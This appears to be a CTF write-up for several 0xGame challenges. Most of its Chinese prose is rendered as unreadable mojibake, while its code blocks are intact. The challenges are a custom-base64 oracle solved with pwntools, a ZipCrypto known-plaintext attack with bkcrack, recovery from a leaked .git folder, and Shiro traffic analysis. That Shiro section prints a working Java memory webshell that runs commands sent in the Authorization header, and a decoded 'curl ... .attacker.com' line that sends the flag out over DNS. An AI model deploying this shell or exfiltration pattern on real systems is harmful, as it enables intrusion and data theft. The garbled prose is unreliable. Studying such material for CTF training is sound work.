ä¸‰ä¸ªå­—èŠ‚è½¬æ¢ä¸º24ä½çš„äºŒè¿›åˆ¶æ•°æ®ï¼Œç„¶ååˆ†å‰²æ•´ç†æˆ4ç»„6ä½äºŒè¿›åˆ¶ï¼Œå°†å®ƒä»¬è½¬æ¢æˆåè¿›åˆ¶ä½œä¸ºç´¢å¼•å€¼ï¼Œæœ€åå°±æ˜¯åœ¨base64å­—ç¬¦é›†ä¸­æ‰¾åˆ°å¯¹åº”çš„å¯†æ–‡å­—ç¬¦è¿›è¡Œæ‹¼æ¥ã€‚

è¿™é‡Œæœ‰ä¸ªç»“è®ºï¼Œé‚£å°±æ˜¯3ä¸ªæ˜æ–‡å­—ç¬¦ç¼–ç åä¸€å®šä¼šå¾—åˆ°4ä¸ªå­—ç¬¦çš„å¯†æ–‡ï¼Œä¸”ä¸å¯èƒ½å‡ºç°=ä½œä¸ºå¡«å……ã€‚

psï¼šå¦‚æœä½ åœ¨ Linux ä¸­ç”¨ echo "abc" | base64 ä¼šå¾—åˆ°å¸¦ = çš„ç»“æœï¼Œé‚£æ˜¯å› ä¸º echo é»˜è®¤ä¼šåœ¨å­—ç¬¦ä¸²æœ«å°¾æ·»åŠ ä¸€ä¸ªæ¢è¡Œç¬¦ \nï¼Œå¯¼è‡´å®é™…è¾“å…¥æ˜¯ 4 ä¸ªå­—èŠ‚ï¼ˆabc\nï¼‰ï¼Œè€Œ Base64 å¯¹é 3 çš„å€æ•°å­—èŠ‚ä¼šå¡«å…… =ã€‚è‹¥ä½¿ç”¨ echo -n "abc" | base64 æˆ– Python çš„ base64.b64encode(b"abc")ï¼Œå°±ä¸ä¼šæœ‰å¡«å……ã€‚
```

åœ¨ Base64 ç¼–ç ä¸­ï¼Œæ¯ 3 ä¸ªå­—èŠ‚è¢«åˆ’åˆ†ä¸º 4 ä¸ª 6 ä½ç»„ã€‚å…¶ä¸­ï¼Œ**ç¬¬ 4 ä¸ª 6 ä½ç»„å®Œå…¨ç”±ç¬¬ 3 ä¸ªè¾“å…¥å­—èŠ‚çš„ä½ 6 ä½æ„æˆ**ï¼ˆå› ä¸ºå‰ä¸¤ä¸ªå­—èŠ‚å…± 16 ä½ï¼Œåªèƒ½å½±å“å‰ 3 ä¸ª 6 ä½ç»„ï¼‰ã€‚å› æ­¤ï¼Œæ— è®ºå‰ä¸¤ä¸ªå­—èŠ‚æ˜¯ä»€ä¹ˆï¼Œåªè¦å›ºå®šå®ƒä»¬ï¼Œæ”¹å˜ç¬¬ 3 ä¸ªå­—èŠ‚ï¼Œç¬¬ 4 ä¸ªè¾“å‡ºå­—ç¬¦å°±åªç”±ç¬¬ 3 å­—èŠ‚çš„ä½ 6 ä½ï¼ˆå³ `byte3 % 64`ï¼‰å†³å®šã€‚ï¼ˆæ‰€ä»¥è¯´ `'AA'` å®Œå…¨æ˜¯å ä½ç¬¦ï¼Œä½ å¯ä»¥ç”¨ä»»æ„ä¸¤ä¸ªå¯æ‰“å°å­—ç¬¦ä»£æ›¿ï¼Œæ¯”å¦‚ `'BB'`ã€`'!!'` ç­‰ï¼Œåªè¦ä¿æŒå›ºå®šå³å¯ã€‚

ä¸‹é¢æˆ‘ä»¬æ‹¿ AAX ä¸¾ä¾‹ï¼ˆæ ‡è®°ï¼šè¿™é‡Œçš„ X æ˜¯ä»»æ„å¯æ‰“å°å­—ç¬¦,ç„¶å AA ä»…ä»…æ˜¯ç”¨æ¥å ä½

```text
å·²çŸ¥ï¼šAï¼šASCIIå€¼ä¸º65
     X:ASCIIå€¼[33,126],åªè¦æ˜¯å¯æ‰“å°å­—ç¬¦éƒ½å¯ï¼Œæˆ‘ä»¬ä¸‹é¢è½¬æ¢äºŒè¿›åˆ¶çš„æ—¶å€™ç”¨'x'ä»£æ›¿(xåªèƒ½å–å€¼0æˆ–1

  æ˜æ–‡   |   A     |    A     |    X
8ä½äºŒè¿›åˆ¶ |01000001 | 01000001 | xxxxxxxx
æˆ‘ä»¬æ‹¿æ­£å¸¸å­—ç¬¦é›†é¡ºåº(A-Z,a-z,0-9,+,/)è¿›è¡Œä¸¾ä¾‹
A(65),/(47)
ä¸¾ä¾‹ä¸€ï¼š
   A        A         A
01000001 01000001 01000001
010000 010100 000101 000001
  16     20     5      1    <----è¿™é‡Œçš„ç´¢å¼•å€¼æ˜¯1æ²¡æœ‰ä»»ä½•é—®é¢˜ï¼Œå­—ç¬¦é›†ç´¢å¼•æ˜¯ä»0å¼€å§‹çš„
   Q      U     F      B    <----è¿™é‡Œï¼ŒBæ­£å¥½æ˜¯æ ‡å‡†å­—ç¬¦é›†çš„ç¬¬äºŒä¸ª

ä¸¾ä¾‹äºŒï¼š
   A        A         /
01000001 01000001 00101111
010000 010100 000100 101111
  16     20     4      47    <----è¿™é‡Œçš„ç´¢å¼•å€¼æ˜¯47
   Q      U     E      v    <----è¿™é‡Œï¼Œvæ­£å¥½æ˜¯æ ‡å‡†å­—ç¬¦é›†çš„ç¬¬48ä¸ª
```

å¤§å®¶æœ‰æ²¡æœ‰çœ‹å‡ºæ¥ä»€ä¹ˆï¼Ÿ

> æ„Ÿè§‰è¿˜æ˜¯å¾ˆæ‡µé€¼çš„è¯ï¼Œå¯ä»¥æ‰‹ä¸Šç®—ç®—ï¼Œåˆ’æ‹‰ä¸€ä¸‹ï¼Œä¸€å®šèƒ½æœ‰æ‰€æ‚Ÿ

æˆ‘è¿™é‡Œç¨å¾®å½’çº³æ•´ç†äº†ä¸‹ï¼Œä½¿ç”¨ç¬¬ 3 ä¸ªå­—æ¯çš„ ASCII å€¼ç›´æ¥å¯¹ 64 è¿›è¡Œå–ä½™è¿ç®—ï¼Œæ‹¿åˆ°çš„å€¼å°±æ˜¯ç¬¬ 4 ä¸ªå¯†æ–‡çš„ç´¢å¼•å€¼ï¼Œå…¶ä¸­çš„æ•°å­¦åŸç†å’Œä¸Šé¢ä¸¾çš„ä¾‹å­ï¼ˆå–ä½ 6 ä½ï¼‰æ˜¯ä¸€æ ·çš„ï¼Œæ¯”å¦‚è¯´ A(65)ï¼Œå¯¹ 64 è¿›è¡Œå–ä½™çš„ç»“æœæ˜¯ 1ï¼Œç„¶å/(47)ï¼Œå¯¹ 64 å–ä½™æ˜¯ 47ï¼Œè®¡ç®—ç»“æœå®Œå…¨æ˜¯ä½ 6 ä½è½¬æ¢åè¿›åˆ¶çš„ç»“æœ

*è„šæœ¬çš„æ ¸å¿ƒåŸç†ï¼š****Base64 ç¼–ç åç¬¬ 4 ä¸ªå­—ç¬¦çš„ç´¢å¼•å€¼ï¼Œç­‰äºç¬¬ 3 ä¸ªè¾“å…¥å­—èŠ‚çš„ä½ 6 ä½ï¼ˆå³&#x20;***`byte3 % 64`***ï¼‰****ã€‚*

```python
import base64
import string
from pwn import *

HOST = 'nc1.ctfplus.cn' 
PORT = 38453 

def solve():
    try:
        p = remote(HOST, PORT)
    except PwnlibException as e:
        print(f"[ERROR] æ— æ³•è¿æ¥åˆ°æœåŠ¡å™¨ {HOST}:{PORT}. é”™è¯¯: {e}")
        return

    
    p.recvuntil(b'Choose an option (1/2): ')
    p.sendline(b'1')
    p.recvuntil(b'> ')

    
    charset_map = {}
    PROBE_START = 33
    PROBE_END = 96 #33 + 64 - 1 = 96ï¼Œè¿ç»­64ä¸ªASCIIå­—ç¬¦è¶³ä»¥è¦†ç›–æ‰€æœ‰ (i % 64) çš„å¯èƒ½å€¼
    
    i = PROBE_START
    while len(charset_map) < 64:
      
        if i > PROBE_END:
            # ç†è®ºä¸Šä¸å¯èƒ½è§¦å‘çš„
            p.error("FATAL: Failed to discover all 64 characters within the visible range (33-126). Aborting.")
            p.close()
            return

        probe_char = chr(i)
        # 'AA' + æ¢æµ‹å­—ç¬¦ X
        probe_data = ('AA' + probe_char).encode('ascii')

        p.sendline(probe_data)
        
        p.recvuntil(b'Result: ')
        encoded_result = p.recvline().strip().decode()
        
        if len(encoded_result) < 4:
             p.warn(f"i={i} ({probe_char}): Unexpected result length {len(encoded_result)} ('{encoded_result}'). Skipping.")
             i += 1
             continue
        
        # ç²¾ç¡®æå–ç¬¬ 4 ä¸ªå­—ç¬¦ (ç´¢å¼• 3)
        target_char = encoded_result[3]

        target_index = i & 0x3f #0x3f = 63ï¼Œä½è¿ç®—å–æœ€å6ä½ 
        #target_index = i % 64  #ä¸Šä¸‹ä¸¤ç§å†™æ³•ç­‰ä»·ï¼Œå–ä½™è¿ç®—ï¼Œæœ¬è´¨ä¸Šéƒ½æ˜¯ç›´æ¥æ‹¿åˆ°ä½6ä½
 #ä¸€äº›æ•°å­¦ä¸Šçš„è§£é‡Šï¼šå› ä¸º 64 æ˜¯ 2 çš„å¹‚ï¼Œi % 64 ç­‰ä»·äºå– i çš„ä½ 6 ä½ï¼Œå³ i & 0x3Fï¼Œä½è¿ç®—æ›´å¿«
        
        if target_index not in charset_map:
            # ä¸¥æ ¼æ’é™¤å¡«å……å­—ç¬¦ '='
            if target_char == '=':
                 p.warn(f"i={i} ({probe_char}): Encountered unexpected '=' character. Skipping this index {target_index}.")
                 i += 1
                 continue
                 
            charset_map[target_index] = target_char
        
        print(f"\r[*] Progress: {len(charset_map)}/64 discovered", end="")
        i += 1

    print("\n[+] Charset map fully discovered!")
    final_charset = "".join(charset_map.get(k, '?') for k in range(64))

    if '?' in final_charset:
        p.error(f"Build failed. Resulting charset is incomplete: {final_charset}")
        p.close()
        return
        
    if len(set(final_charset)) != 64:
        p.error(f"Build failed. Resulting charset contains duplicates or invalid chars: {final_charset}")
        p.close()
        return

    p.success(f"Reconstructed charset: {final_charset}")
    p.sendline(b'!q')
    p.recvuntil(b'Choose an option (1/2): ')
    p.sendline(b'2')
    p.recvuntil(b'Your charset guess: ')
    p.sendline(final_charset.encode())
    
    p.success("Charset submitted! Receiving flag...")

    flag_output = p.recvall(timeout=2).decode()
    print("\n" + "="*20 + " FLAG " + "="*20)
    print(flag_output)
    print("="*46)
    
    p.close()

if __name__ == "__main__":
    solve()
```

> è§£å†³æ–¹å¼çœŸçš„å¾ˆå¤šï¼ŒSpreng å¸ˆå‚…è¿˜æœ‰ä¸ªçº¯å¯†ç æµ‹è¯•è„šæœ¬ï¼Œå¦‚æœå¯¹è¿™ä¸ªçŸ¥è¯†ç‚¹æ„Ÿå…´è¶£å¯ä»¥å’Œä»–æ¢è®¨ä¸€äºŒ

### å¼€é”å¸ˆå‚…

æœ¬é¢˜æ˜¯ zip å‹ç¼©åŒ…æ”»å‡»åˆ†ç±»ä¸­çš„æ˜æ–‡æ”»å‡»ï¼Œå¯ä»¥çœ‹åˆ°çš„ï¼Œå‹ç¼©åŒ…ä¸­å­˜åœ¨ä¸€ä¸ª png å›¾ç‰‡ï¼Œä¸€äº› png æ–‡ä»¶ç»“æ„ç›¸å…³çš„çŸ¥è¯†ï¼Œè¯·ä¸Šç½‘æœç´¢

æˆ‘ä»¬ä¼šç”¨åˆ°çš„éƒ¨åˆ†çŸ¥è¯†æ˜¯ png æœ‰å›ºå®šçš„é­”æ•°å¤´ï¼š`89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52`

å¯ä»¥è¯´ï¼Œæ‰€æœ‰æ­£å¸¸çš„ png æ–‡ä»¶å¤´ï¼Œå‰é¢è¿™ 16 å­—èŠ‚ä¸€å®šæ˜¯ä¸€æ ·çš„ï¼Œåˆ†åˆ«æ˜¯æ–‡ä»¶é­”æ•°æ ‡å¿—ä»¥åŠ IHDR æ•°æ®å—çš„åç§°ï¼Œå¤§å®¶å¯ä»¥è‡ªå·±åŠ¨æ‰‹çœ‹çœ‹

æ¥ä¸‹æ¥è¯´è¯´æ˜æ–‡æ”»å‡»å®ç°çš„åˆ©ç”¨æ–¹æ³•

> å…³äºæ˜æ–‡æ”»å‡»çš„å®ç°åŸç†ï¼Œå¯ä»¥å‚è€ƒè¿™ä½ä½¬çš„åšå®¢æ–‡ç« <https://flandre-scarlet.moe/blog/1685/>

ç®€å•è¯´æ˜ï¼Œå®ç° zip æ˜æ–‡æ”»å‡»çš„å‰æåˆ†åˆ«æ˜¯ï¼š

* å‹ç¼©åŒ…çš„å‹ç¼©æ–¹å¼å¿…é¡»æ˜¯ ZipCrypto åŠ å¯†ï¼ˆdeflate æˆ– Store æ¨¡å¼å‡å¯ï¼‰

* å¿…é¡»å·²çŸ¥ 8 å­—èŠ‚çš„è¿ç»­æ˜æ–‡å’Œå¯¹åº”åç§»ï¼Œè¿›è¡Œæ¢å¤å¯†é’¥ï¼Œç„¶åè¿˜éœ€è¦ 4 å­—èŠ‚æ˜æ–‡å‚ä¸å¯†é’¥éªŒè¯ï¼Œ4 å­—èŠ‚æ˜æ–‡å¯ä»¥ä¸ 8 å­—èŠ‚æ˜æ–‡ä¸è¿ç»­ï¼Œæ˜æ–‡çŸ¥é“è¶Šå¤šï¼Œè§£å¯†é€Ÿåº¦è¶Šå¿«

æ­£å¸¸è€Œè¨€ï¼Œæˆ‘ä»¬ä½¿ç”¨ bkcrack å·¥å…·è¿›è¡Œæ˜æ–‡æ”»å‡»å±…å¤š

#### how to solve

* step 1

æˆ‘ä»¬å…ˆä½¿ç”¨-L æŸ¥çœ‹å‹ç¼©åŒ…çš„è¯¦ç»†ä¿¡æ¯ï¼Œå‘ç°å®ƒä»¬æ˜¯ ZipCrypto åŠ å¯†æ–¹å¼çš„ Store å‹ç¼©æ¨¡å¼ï¼Œç„¶åè§‚å¯Ÿåˆ°é‡Œé¢å°±ä¸¤ä¸ªæ–‡ä»¶ï¼Œå…¶ä¸­ä¸€ä¸ªå°±æ˜¯æˆ‘ä»¬éœ€è¦åˆ©ç”¨çš„ png

```plain
$ bkcrack -L attachment.zip
bkcrack 1.8.0 - 2025-08-18
Archive: attachment.zip
Index Encryption Compression CRC32    Uncompressed  Packed size Name
----- ---------- ----------- -------- ------------ ------------ ----------------
    0 ZipCrypto  Store       e7b7038a           80           92 flag.txt
    1 ZipCrypto  Store       04a6dc2d     10149855     10149867 huiliyi.png
```

* step 2

æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦æƒ³åŠæ³•åˆ›é€  bkcrack å¯ä»¥åˆ©ç”¨çš„æ˜æ–‡ï¼ˆæ˜¾ç„¶ä¸èƒ½ç”¨ä¸Šé¢ä½ ä»¬ç›´æ¥çœ‹åˆ°çš„ 8950 å•Šï¼Œè¿™ä¸ªæ˜¯ç»™æˆ‘ä»¬çœ‹çš„ï¼Œä½†æ˜¯ç»™ bkcrack çœ‹çš„è¯ï¼Œå°±è¦ç”¨æºæ•°æ®å¤„ç†

```plain
$ echo 89504E470D0A1A0A0000000D49484452 | xxd -r -ps >pngheader
$ cat pngheader
ï¿½PNG
â¦
IHDR
```

* step 3

æ¥ä¸‹æ¥æ˜¯ç›´æ¥å¼€å§‹æ˜æ–‡æ”»å‡»ï¼Œç®€å•è¯´æ˜ï¼Œ-C æŒ‡å®šçš„æ˜¯åŠ å¯†å‹ç¼©åŒ…ï¼Œ-c æŒ‡å®šäº†æˆ‘ä»¬æ˜æ–‡æ”»å‡»åˆ©ç”¨çš„æ–‡ä»¶ï¼ˆæˆ‘ä»¬å·²çŸ¥éƒ¨åˆ†æ˜æ–‡çš„æ–‡ä»¶ï¼‰ï¼Œ-p æŒ‡å®šçš„æ˜¯æˆ‘ä»¬è¦åˆ©ç”¨çš„æ˜æ–‡

è¿™é‡Œæ²¡æœ‰ç»™æŒ‡å®šåç§»ï¼Œå®Œå…¨æ˜¯å› ä¸ºæˆ‘ä»¬åˆ©ç”¨çš„æ˜æ–‡æ˜¯ png æ–‡ä»¶å¤´ï¼Œbkcrack ä¼šé»˜è®¤ä»æ–‡ä»¶å¤´ä¹Ÿå°±æ˜¯åç§»é‡ 0 å¼€å§‹è¿›è¡Œæ”»å‡»ï¼Œå¦‚æœéœ€è¦æŒ‡å®šåç§»ï¼Œéœ€è¦ä½¿ç”¨-o

```plain
$ bkcrack -C attachment.zip -c huiliyi.png -p pngheader
bkcrack 1.8.0 - 2025-08-18
[13:59:25] Z reduction using 9 bytes of known plaintext
100.0 % (9 / 9)
[13:59:25] Attack on 728540 Z values at index 6
Keys: cdc564be 5675041f 719adb56
25.0 % (181808 / 728540)
Found a solution. Stopping.
You may resume the attack with the option: --continue-attack 181808
[14:00:09] Keys
cdc564be 5675041f 719adb56
```

* step 4

æ¥ä¸‹æ¥å°±æ˜¯æ‹¿ç¬¬ä¸‰æ­¥å¾—åˆ°çš„ keys è¿›è¡Œè§£å¯†ï¼Œè¯»å– flagï¼Œæœ‰å¤šç§æ–¹å¼

```plain
bkcrack -C attachment.zip -k cdc564be 5675041f 719adb56 -U flag.zip 123456
```

ä¸Šè¿°æ–¹å¼æ˜¯å°†å‹ç¼©åŒ…çš„å¯†ç æ”¹æˆ 123456 é‡æ–°æ‰“åŒ…ï¼Œè¿™æ ·æˆ‘ä»¬å°±ç”¨è‡ªå·±è®¾ç½®çš„å¯†ç è§£å‹å³å¯

```plain
bkcrack -C attachment.zip -k cdc564be 5675041f 719adb56 -c flag.txt -d flag.txt && cat flag.txt
```

è¿™ä¸ªæ–¹å¼æ˜¯ç›´æ¥å°†å‹ç¼©åŒ…é‡Œé¢çš„æ–‡ä»¶è¿›è¡Œæå–ï¼Œç›´æ¥è¯»

ä¸Šé¢ä¸¤ä¸ªéƒ½å·®ä¸å¤šï¼Œè¦ç”¨åˆ° keys çš„ï¼Œæ‰€ä»¥ step2 å’Œ 3 æ˜¯æˆ‘ä»¬è¿›è¡Œæ˜æ–‡æ”»å‡»çš„å…³é”®

è¿™é‡Œçš„æ˜æ–‡æ”»å‡»çœŸçš„å¥½æœ‰æ„æ€çš„ï¼Œæˆ‘ä¸ºå¤§å®¶å‡†å¤‡äº†ä¸€ä¸ªç¨å¾®è¿›é˜¶çš„æ˜æ–‡æ”»å‡»é¢˜ç›®ï¼Œå¯ä»¥å°è¯•è§£ç­”ä¸‹

[é™„ä»¶ä¸‹è½½é“¾æ¥](https://www.ilanzou.com/s/OO9NiHas)

```text
å‰é¢çš„ä¸çŸ¥é“ï¼Œåé¢çš„ä¹Ÿä¸çŸ¥é“ï¼Œå°±åªçŸ¥é“è¿™å‡ ä¸ªæ˜æ–‡å­—ç¬¦ï¼Œä½ æœ‰åŠæ³•æ¢å¤å‡ºæ¥å—ï¼Ÿ
0xGame{6?????????????mast??????????}
```

### åˆ åº“è·‘è·¯

æœ¬é¢˜è€ƒå¯Ÿçš„æ˜¯.git æ–‡ä»¶æ³„éœ²ï¼Œè¿™ä¸ªæ–‡ä»¶å¤¹å¾ˆå…³é”®ï¼Œåœ¨åé¢å­¦ä¹ ä¿¡æ¯æœé›†ã€æ¸—é€ã€æˆ–æŒ–æ¼æ´çš„æ—¶å€™ï¼Œå¦‚æœèƒ½æ‹¿åˆ°è¿™ä¸ªæ–‡ä»¶å¤¹ï¼Œé‚£å°±èµšäº†ï¼Œå› ä¸ºé‡Œé¢åŒ…å«é¡¹ç›®çš„æ›´æ”¹è®°å½•ï¼Œå®Œæ•´æ–‡ä»¶å†…å®¹ä¹Ÿåœ¨é‡Œé¢å‘¢ã€‚æœ‰çš„æ—¶å€™å‡ºé¢˜å¸ˆå‚…ä¼šå°† flag ç¼–è¾‘åï¼Œæ›´æ–°è¿‡ä»“åº“å†åˆ é™¤ï¼Œé‚£ä¹ˆ flag å®Œå…¨å¯ä»¥é€šè¿‡æ—¥å¿—è¢«æ¢å¤å‡ºæ¥

å› ä¸º.git æ–‡ä»¶å¤¹é‡Œé¢çš„æ•°æ®å­˜å‚¨æ˜¯ zilb å‹ç¼©ï¼Œæ‰€ä»¥ä¹Ÿä¸æ¶‰åŠè§£å¯†ä»€ä¹ˆçš„æ“ä½œ,ç»™å‡ºä¸€ä¸ªè§£å¯†ç…§ç‰‡

ä½†æ˜¯ä¸ºäº†æ›´åŠ æ–¹ä¾¿å¿«æ·ï¼Œç›´æ¥æŒ‰ç…§ä»“åº“æ›´æ–°è¿›è¡Œæ–‡ä»¶æ¢å¤ï¼ŒæŒºå»ºè®®ä½¿ç”¨å·¥å…· GitTools,é¡¹ç›®åœ°å€<https://github.com/internetwache/GitTools>

Look hereï¼Œå‘ç°å‰ååªæœ‰ä¸¤æ¬¡æ›´æ–°ä»“åº“

ç›´æ¥é”å®š main.py

è¿™é‡Œå°±æ˜¯è€ƒå¯Ÿäº†ä¸‹å¤§å®¶çš„ä»£ç å®¡è®¡èƒ½åŠ›ï¼Œå¾ˆè½»æ¾çš„ï¼Œå…ˆè¿›è¡Œå‡¯æ’’åŠ å¯†ï¼Œç„¶åè¿›è¡Œ xor å¼‚æˆ–ï¼Œæœ€åæ˜¯ base64 ç¼–ç ï¼Œæˆ‘ä»¬è§£å¯†çš„æ—¶å€™åªéœ€è¦å€’è¿‡æ¥æ“ä½œå³å¯

```python
#ç»ä¾›å‚è€ƒ
import base64
xor_key=0x66
caser_shift=114514

def xor_bytes(data:bytes,key:int)->bytes:
	return bytes(b^key for b in data)

def caser_decrypt(text:str,shift:int) -> str:
	result=[]
	for char in text:
		if 'A' <=char<='Z':
			result.append(chr((ord(char)-ord('A')-shift)%26+ord('A')))
		elif 'a' <=char<='z':
			result.append(chr((ord(char)-ord('a')-shift)%26+ord('a')))

		else:
			result.append(char)
	return ''.join(result)

def main_decrypt():
	with open('output','r',encoding='ascii') as f:
		content=f.read().strip()
	step3_bytes=base64.b64decode(content.encode('ascii'))
	step2_bytes=xor_bytes(step3_bytes,xor_key)
	step2_str=step2_bytes.decode('utf-8')
	flag=caser_decrypt(step2_str,caser_shift)

	print(flag)

if __name__=="__main__":
	main_decrypt()
```

### ezShiro

> åŸºç¡€çš„ shiro æµé‡è§£å¯†è¿˜æœ‰ dns è®°å½•

#### how to solve

ä¸‹æ¬¡é‡åˆ°æµé‡åˆ†æä¸­å‡ºç° rememberMe çš„æ—¶å€™ï¼Œåº”å½“æƒ³åˆ° shiro åŠ å¯†æµé‡ï¼Œä¸‹é¢æˆ‘ä»…ä»…è®²è¿°è§£é¢˜æ­¥éª¤

æ¨èåœ¨çº¿å·¥å…·<https://potato.gold/navbar/tool/shiro/ShiroTool.html>

*åŸç†æˆ‘ä¼šåœ¨æœ€ä¸‹é¢ç®€å•è®²è®²*

é¦–å…ˆè¿½è¸ªç¬¬ä¸€ä¸ª http æµ

ä¼šçœ‹åˆ°å¾ˆé•¿çš„è¯·æ±‚åŒ…

å°†å¯¹åº”çš„ Cookie å¤åˆ¶åˆ°åœ¨çº¿å·¥å…·ä¸­ï¼Œç„¶åè¾“å…¥å¯†é’¥`kPH+bIxk5D2deZiIxcaaaA==`ï¼ˆè¿™æ˜¯ä¸€ç§çº¦å®šä¿—æˆæˆ–è€…è¯´æ˜¯é»˜è®¤çš„å¯†é’¥ï¼Œä¸‹æ¬¡é‡åˆ°è¿™ç±»é¢˜ï¼Œå¦‚æœå¯†é’¥ä¸å¯¹ï¼Œé‚£ä¹ˆå¯èƒ½è€ƒå¯Ÿçš„æ˜¯å¯†é’¥çˆ†ç ´ï¼Œå…·ä½“çš„é—®é¢˜å¯ä»¥è‡ªè¡Œç ”ç©¶

![image-20251007213827153](/img/0xgame2025/20251013231152_000.webp)

æœ€ä¸‹é¢å‡ºç°äº†åç¼–è¯‘çš„ç»“æœ

```java
package com.summersec.x;

import java.util.Scanner;
import java.util.List;
import java.lang.reflect.Field;
import org.apache.shiro.codec.Base64;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;

public class Test422640791304000 extends AbstractTranslet
{
    private static void writeBody(final Object o, final byte[] array) throws Exception {
        final byte[] bytes = new StringBuffer().append("$$$").append(Base64.encodeToString(array)).append("$$$").toString().getBytes();
        try {
            final Class forName = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
            final Object instance = forName.newInstance();
            forName.getDeclaredMethod("setBytes", byte[].class, Integer.TYPE, Integer.TYPE).invoke(instance, bytes, new Integer(0), new Integer(bytes.length));
            o.getClass().getMethod("doWrite", forName).invoke(o, instance);
        }
        catch (final Exception ex) {
            final Class forName2 = Class.forName("java.nio.ByteBuffer");
            o.getClass().getMethod("doWrite", forName2).invoke(o, forName2.getDeclaredMethod("wrap", byte[].class).invoke(forName2, bytes));
        }
    }
    
    private static Object getFV(final Object o, final String s) throws Exception {
        Field declaredField = null;
        Class clazz = o.getClass();
        while (clazz != Object.class) {
            try {
                declaredField = clazz.getDeclaredField(s);
                break;
            }
            catch (final NoSuchFieldException ex) {
                clazz = clazz.getSuperclass();
            }
        }
        if (declaredField == null) {
            throw new NoSuchFieldException(s);
        }
        declaredField.setAccessible(true);
        return declaredField.get(o);
    }
    
    public Test422640791304000() throws Exception {
        boolean b = false;
        final Thread[] array = (Thread[])getFV(Thread.currentThread().getThreadGroup(), "threads");
        for (int i = 0; i < array.length; ++i) {
            final Thread thread = array[i];
            if (thread != null) {
                final String name = thread.getName();
                if (!name.contains("exec") && name.contains("http")) {
                    final Object fv = getFV(thread, "target");
                    if (fv instanceof Runnable) {
                        Object fv2;
                        try {
                            fv2 = getFV(getFV(getFV(fv, "this$0"), "handler"), "global");
                        }
                        catch (final Exception ex) {
                            continue;
                        }
                        final List list = (List)getFV(fv2, "processors");
                        for (int j = 0; j < list.size(); ++j) {
                            final Object fv3 = getFV(list.get(j), "req");
                            final Object invoke = fv3.getClass().getMethod("getResponse", (Class[])new Class[0]).invoke(fv3, new Object[0]);
                            final String s = (String)fv3.getClass().getMethod("getHeader", String.class).invoke(fv3, new String("Host"));
                            if (s != null && !s.isEmpty()) {
                                invoke.getClass().getMethod("setStatus", Integer.TYPE).invoke(invoke, new Integer(200));
                                invoke.getClass().getMethod("addHeader", String.class, String.class).invoke(invoke, new String("Host"), s);
                                b = true;
                            }
                            final String s2 = (String)fv3.getClass().getMethod("getHeader", String.class).invoke(fv3, new String("Authorization"));
                            if (s2 != null && !s2.isEmpty()) {
                                final String decodeToString = Base64.decodeToString(s2.replaceAll("Basic ", ""));
                                writeBody(invoke, new Scanner(new ProcessBuilder(System.getProperty("os.name").toLowerCase().contains("window") ? new String[] { "cmd.exe", "/c", decodeToString } : new String[] { "/bin/sh", "-c", decodeToString }).start().getInputStream()).useDelimiter("\\A").next().getBytes());
                                b = true;
                            }
                            if (b) {
                                break;
                            }
                        }
                        if (b) {
                            break;
                        }
                    }
                }
            }
        }
    }
}
```

å®¡è®¡ä»£ç åï¼Œå‘ç°è¿™ä¸ª JavağŸå°±å¹²äº†è¿™äº›äº‹

**Header æ£€æµ‹:**

* ä»£ç å°è¯•è·å– `Host` å¤´éƒ¨ï¼Œå¦‚æœå­˜åœ¨ï¼Œåˆ™è¿”å› `200` çŠ¶æ€ç å’Œ `Host` å¤´éƒ¨ï¼Œä½œä¸º**è¿é€šæ€§/èº«ä»½éªŒè¯**çš„ä¿¡å·ã€‚

* ä»£ç å°è¯•è·å– `Authorization` å¤´éƒ¨ã€‚

**å‘½ä»¤æ‰§è¡Œ:**

* `Base64.decodeToString(s2.replaceAll("Basic ", ""))`: å¯¹ `Authorization` å¤´éƒ¨çš„å€¼è¿›è¡Œ **Base64 è§£ç **ï¼Œè¿™ä¸ªè§£ç åçš„å­—ç¬¦ä¸²å°±æ˜¯æ”»å‡»è€…æƒ³è¦æ‰§è¡Œçš„**æ“ä½œç³»ç»Ÿå‘½ä»¤**ã€‚

* `new ProcessBuilder(...) .start()`: æ ¹æ®æ“ä½œç³»ç»Ÿï¼ˆWindows ä½¿ç”¨ `cmd.exe /c`ï¼Œå…¶ä»–ä½¿ç”¨ `/bin/sh -c`ï¼‰ï¼Œæ‰§è¡Œè§£ç åçš„å‘½ä»¤ã€‚

* **å›æ˜¾ (**`writeBody`**):** å‘½ä»¤æ‰§è¡Œçš„ç»“æœï¼ˆ`InputStream`ï¼‰è¢«è¯»å–ï¼Œç„¶åé€šè¿‡ `writeBody` æ–¹æ³•å†™å…¥åˆ° HTTP **å“åº”ä½“**ä¸­ã€‚

  * `writeBody` é€šè¿‡åå°„è°ƒç”¨å®¹å™¨çš„å†…éƒ¨æ–¹æ³• (`doWrite`)ï¼Œå°†ç»“æœç”¨ `$$$...$$$` å°è£…å **Base64 ç¼–ç **å‘é€å›æ”»å‡»è€…ã€‚

è¯´ç®€å•ç‚¹ï¼Œå°±æ˜¯ hacker çš„å‘½ä»¤ä¼šåœ¨ Authorization éƒ¨åˆ†ï¼Œç„¶åå›æ˜¾ä¼šç”¨$$$...$$$åŒ…è£¹ï¼Œé‡Œé¢çš„é‡è¦ä¿¡æ¯å…¨ç”¨ base64 ç¼–ç 

ä¸‹é¢æˆ‘å›¾ä¸Šæ ‡æ³¨çš„å¤Ÿæ¸…æ™°äº†å§

![image-20251007215907167](/img/0xgame2025/20251013231153_001.webp)

> å¦‚æœå¯¹äºä¸Šé¢çš„ä»£ç å®¡è®¡éƒ¨åˆ†æ„Ÿè§‰å¾ˆåƒåŠ›ï¼Œå¯ä»¥æš‚æ—¶æ”¾æ”¾ï¼Œæ¯•ç«Ÿè¿™ä¸ªé¢˜ä¸æ˜¯ä¸€å®šè¦è§£å¯†å†…å­˜é©¬æ‰èƒ½è§£å†³çš„ï¼Œå‘ç°ä¸Šé¢çš„è§„å¾‹å°±èƒ½ç»§ç»­è§£é¢˜

æµé‡åŒ…ä¸å¤šï¼Œè§£å¯†çš„æ—¶å€™ä¼šçœ‹åˆ°è¿™ä¸ªçš„

```bash
~$ echo Y3VybCAkKGNhdCAvZmxhZyB8IHJldiB8IHRyICdBLVphLXonICdOLVpBLU1uLXphLW0nIHwgYmFzZTY0IHwgdHIgLWQgJ1xuJykuYXR0YWNrZXIuY29t | base64 -d
curl $(cat /flag | rev | tr 'A-Za-z' 'N-ZA-Mn-za-m' | base64 | tr -d '\n').attacker.com
```

